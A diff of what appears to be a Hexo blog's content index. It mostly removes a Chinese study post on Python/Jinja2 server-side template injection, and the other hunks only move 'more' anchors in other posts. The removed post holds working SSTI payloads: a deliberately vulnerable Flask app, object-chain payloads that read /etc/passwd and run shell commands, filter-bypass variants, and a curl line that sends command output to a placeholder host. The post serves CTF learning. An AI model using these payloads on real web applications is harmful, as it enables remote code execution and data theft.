@@ -1171,228 +1171,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Python SSIT学习</title>
-    <url>/2020/08/07/Python%20SSIT%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>学习一波模板注入，参考：</p>
-<p><a class="foo" target="_blank" href="https://xz.aliyun.com/t/6885#toc-0">Python模板注入(SSTI)深入学习</a><a id="more"></a></p>
-<h1 id="什么是SSIT"><a href="#什么是SSIT" class="headerlink" title="什么是SSIT"></a><strong>什么是SSIT</strong></h1><blockquote>
-
-
-举一个例子
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
-在上述代码中，直接将用户可控参数`request.args.get('404_url')`在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。
-
-<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200807151918090.png" style="high:80%;width:80%;" />
-
-可以看到，页面直接返回了81而不是{{9*9}}
-
-> 
-</blockquote>
-<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a><strong>常见的魔术方法</strong></h1><ul>
-<li><code>__class__</code></li>
-</ul>
-<p>用于返回该对象所属的类</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">o = class1()</span><br><span class="line"></span><br><span class="line">print(o.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>__bases__</code></li>
-</ul>
-<p>以元组的形式返回一个类所直接继承的类。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__bases__)</span><br><span class="line"><span class="comment">#(&lt;class &#x27;__main__.class1&#x27;&gt;,)</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>__base__</code></li>
-</ul>
-<p>以字符串返回一个类所直接继承的类。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span>(<span class="params">class1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(class2.__base__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;__main__.class1&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>__subclasses__()</code></li>
-</ul>
-<p>获取类的所有子类。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">Base1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(Base1.__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;__main__.test&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>__mro__</code></li>
-</ul>
-<p>返回解析方法调用的顺序。</p>
-<ul>
-<li><code>__init__</code></li>
-</ul>
-<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
-<ul>
-<li><code>__globals__</code></li>
-</ul>
-<p>会以字典类型返回当前位置的全部模块，方法和全局变量。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(test.__init__.__globals__)</span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001B297C64668&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\1.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;D:\\Python37\\lib\\os.py&#x27;&gt;, &#x27;var&#x27;: 2333, &#x27;fun&#x27;: &lt;function fun at 0x000001B297C1C1E0&gt;, &#x27;test&#x27;: &lt;class &#x27;__main__.test&#x27;&gt;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="构造链思路"><a href="#构造链思路" class="headerlink" title="构造链思路"></a><strong>构造链思路</strong></h1><p>思路如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>先使用该payload来获取某个类，这里可以获取到的是str类，实际上获取到任何类都可以，因为我们都最终目的是要获取到基类Object。</p>
-<p>接下来我们可以通过<strong>bases</strong>或者<strong>mro</strong>来获取到object基类。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>接下来获取其所有子类：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ... ,&lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>
-
-<p>我们只需要寻找可能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。</p>
-<h2 id="file对象任意读取文件"><a href="#file对象任意读取文件" class="headerlink" title="file对象任意读取文件"></a><strong>file对象任意读取文件</strong></h2><ul>
-<li>python3中已经移除了file，所以这种方法只能在python2中使用</li>
-</ul>
-<p>file是在子类列表的第41个</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__base__.__subclasses__()[<span class="number">40</span>])</span><br><span class="line"><span class="comment">#&lt;type &#x27;file&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用dir查看file对象中的内置方法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(dir(().__class__.__base__.__subclasses__()[<span class="number">40</span>]))</span><br><span class="line"><span class="comment">#[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__enter__&#x27;, &#x27;__exit__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__iter__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;close&#x27;, &#x27;closed&#x27;, &#x27;encoding&#x27;, &#x27;errors&#x27;, &#x27;fileno&#x27;, &#x27;flush&#x27;, &#x27;isatty&#x27;, &#x27;mode&#x27;, &#x27;name&#x27;, &#x27;newlines&#x27;, &#x27;next&#x27;, &#x27;read&#x27;, &#x27;readinto&#x27;, &#x27;readline&#x27;, &#x27;readlines&#x27;, &#x27;seek&#x27;, &#x27;softspace&#x27;, &#x27;tell&#x27;, &#x27;truncate&#x27;, &#x27;write&#x27;, &#x27;writelines&#x27;, &#x27;xreadlines&#x27;]</span></span><br></pre></td></tr></table></figure>
-
-<p>直接调用里面的方法进行读取文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines())</span><br></pre></td></tr></table></figure>
-
-<h2 id="内置模块执行任意命令"><a href="#内置模块执行任意命令" class="headerlink" title="内置模块执行任意命令"></a><strong>内置模块执行任意命令</strong></h2><blockquote>
-
-
-- 该方法也只能在python2中使用
-
-我们知道`__globals__`能够返回当前引用的所有模块和变量，如果某个类引用了OS模块那就可能能够执行命令。
-
-这里有一个脚本，先遍历所有子类，然后遍历子类的方法的所引用的东西的key也就是键名，来搜索是否调用了os。
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site._Printer&#x27;&gt;, 69)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 74)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-
-然后直接使用
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">69</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">74</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-如果是上面flask的例子
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-直接去爆破375这个数也可以。
-
-> 
-</blockquote>
-<h2 id="builtins-代码执行"><a href="#builtins-代码执行" class="headerlink" title="__builtins__代码执行"></a><strong><code>__builtins__</code>代码执行</strong></h2>
-
-这种的话，python2，3都可以使用。
-
-思路如下：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(dir(__builtins__))</span><br></pre></td></tr></table></figure>
-
-同样查找globals中含有的`__builtins__`
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-payload
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">65</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-> 
-
-<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h1><blockquote>
-
-
-当我们需要测试SSTI过滤了什么的时候，可以使用如下payload防止其500:
-
-`{{"要测试的字符"}}`，只需要看看要测试的字符是否返回在页面中即可，下面分别说说对应各种过滤情况的解决办法。
-
-
-</blockquote>
-<h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h2>
-
-回顾上面的payload
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-前面的引号是为了引出基类，可以被替换为数组、字典，以及数字。
-
-后面的引号可以使用request.args来绕过此处的过滤。
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[request.args.arg1][request.args.arg2](request.args.arg3).read()&#125;&#125;&amp;arg1=os&amp;arg2=popen&amp;arg3=whoami</span><br></pre></td></tr></table></figure>
-
-另外的一种方法
-
-通过python自带函数来绕过引号，这里使用的是chr()。
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[§<span class="number">0</span>§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-通过payload爆破subclasses，获取某个subclasses中含有chr的类索引，可以看到爆破出来很多了，这里随便选一个。
-
-接着尝试使用chr尝试绕过后续所有的引号：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[chr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)][chr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">100</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">114</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-## **过滤中括号**
-
-回顾最初的payload
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-这里globals的中括号有点问题。
-
-a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此来绕过：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">375</span>).__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-## **过滤关键字**
-
-主要看关键字是如何过滤的，如果只是替换为空，可以尝试双写绕过，如果直接ban了，就可以使用字符串合并的方式进行绕过。
-
-使用中括号的payload：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-不使用中括号的payload：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-这里主要使用了**getattribute**来获取字典中的value，参数为key值。
-
-第二种绕过过滤关键字的办法之前也提到了，即使用request对象：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&quot;</span>.__getattribute__(request.args.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>
-
-第三种绕过关键字过滤的办法即使用str原生函数：
-
-我们可以使用decode、replace等来绕过所过滤的关键字。
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.replace(<span class="string">&quot;W&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#YE=</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.decode(<span class="string">&quot;base64&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#aa</span></span><br></pre></td></tr></table></figure>
-
-## **模块阉割**
-
-在比赛环境中，经常会阉割掉一些内置函数，我们可以尝试使用reload来重载。
-
-在Python2中，reload是内置函数，而在Python3中，reload则为imp module下的函数，使用方法：
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> imp <span class="keyword">import</span> reload</span><br><span class="line">reload(a).popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>
-
-我们一般是不能直接reload(os)的，因为可能当前类并没有import os。
-
-所以一般都是`reload(__builtins__)`，这时可以重新载入**builtins**，此时**builtins**中被删除的比如eval、**import**等就又都回来了。
-
-## **过滤{{}}**
-
-相当于把命令执行的结果外带出去。
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
-
-## **过滤点号**
-
-在Python环境中(Python2/Python3)，我们可以使用访问字典的方式来访问函数/类等。
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__等价于<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
-
-> ]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>SSRF漏洞学习</title>
     <url>/2020/07/14/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>总结的不是很全，以后慢慢更。<a id="more"></a></p>
@@ -2050,7 +1828,9 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
   <entry>
     <title>搭建动态CTFd</title>
     <url>/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>网上的搭建教程有很多了，但是有几个比较坑的地方的资料比较零散，这里记录一下从零开始搭建的过程，虽然因为各种原因最后还是学贤大佬帮我搭好了🙃，这个动态靶机是真的方便。<a id="more"></a></p>
+    <content><![CDATA[<a id="more"></a>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>网上的搭建教程有很多了，但是有几个比较坑的地方的资料比较零散，这里记录一下从零开始搭建的过程，虽然因为各种原因最后还是学贤大佬帮我搭好了🙃，这个动态靶机是真的方便。</p>
 <h3 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h3><p>本篇搭建环境为centos7.6</p>
 <p>学贤大佬用的是ubuntu18也搭成功了，但是相对来说还是centos比较方便。</p>
 <h4 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a><strong>更新yum源</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>
@@ -2672,7 +2452,9 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
   <entry>
     <title>反序列化漏洞总结</title>
     <url>/2020/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近在buu刷题，遇到到了一些关于反序列化的题目，这里做一个总结。<a id="more"></a></p>
+    <content><![CDATA[<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近在buu刷题，遇到到了一些关于反序列化的题目，这里做一个总结。</p>
 <h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a><strong>PHP反序列化漏洞</strong></h1><h2 id="序列化和反序列化是什么？"><a href="#序列化和反序列化是什么？" class="headerlink" title="序列化和反序列化是什么？"></a><strong>序列化和反序列化是什么？</strong></h2><blockquote>
 <p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 ——php官方文档</p>
 </blockquote>
@@ -4729,7 +4511,9 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
   <entry>
     <title>【转载】php伪协议在CTF中的应用小结</title>
     <url>/2020/12/22/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E5%B0%8F%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-59593-1-1.html">传送门</a><a id="more"></a></p>
+    <content><![CDATA[<a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a href="https://bbs.ichunqiu.com/thread-59593-1-1.html">传送门</a></p>
 <p>php的伪协议在CTF中算是一个比较老的知识点，也有一些新的利用点，在最近的CTF比赛中比如极客大挑战2020，WMCTF2020中的题目也还会出现，于是本篇文章就把CTF中涉及到这个知识点的地方从浅到深做一个复习和总结</p>
 <blockquote>
 <p>关于php中的伪协议可以参考官方文档：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
@@ -5099,7 +4883,9 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
   <entry>
     <title>【转载】细说Jinja2之SSTI&amp;bypass</title>
     <url>/2020/12/18/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&amp;bypass/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">传送门</a><a id="more"></a></p>
+    <content><![CDATA[<a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发合天：<a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">传送门</a></p>
 <p>SSTI（Server-Side Template Injection）服务端模板注入在CTF中并不是一个新颖的考点了，之前略微学习过，但是最近的大小比赛比如说安洵杯，祥云杯，太湖杯，南邮CTF，上海大学生安全竞赛等等比赛都频频出现，而且赛后看到师傅们各种眼花缭乱的payload，无法知晓其中的原理，促使我写了这篇文章来总结各种bypass SSTI的方法。</p>
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本篇文章从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎</p>
 <h3 id="模板的基本语法"><a href="#模板的基本语法" class="headerlink" title="模板的基本语法"></a>模板的基本语法</h3><p>官方文档对于模板的语法介绍如下</p>
